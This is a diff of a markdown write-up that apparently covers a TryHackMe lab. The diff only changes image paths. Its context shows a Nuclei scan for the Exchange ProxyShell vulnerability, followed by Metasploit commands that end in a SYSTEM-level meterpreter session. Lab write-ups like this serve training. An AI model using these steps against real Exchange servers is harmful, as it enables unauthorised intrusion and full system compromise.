@@ -167,7 +167,7 @@ Using this Nuclei templace we can see if the server is vulnerable to CVE-2021-34
 nuclei -u win-12ouo7a66m7.thm.local -t proxyshell.yaml
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This server is vulnerable, now search the exploit in Metasploit.
 
@@ -176,7 +176,7 @@ sudo service postgresql start && msfconsole
 search exchange
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This module can help us.
 
@@ -187,7 +187,7 @@ set EMAIL dev-infrastracture-team@thm.local
 exploit
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 In this way we have a meterpreter session as NT AUTHORITY\SYSTEM.
 
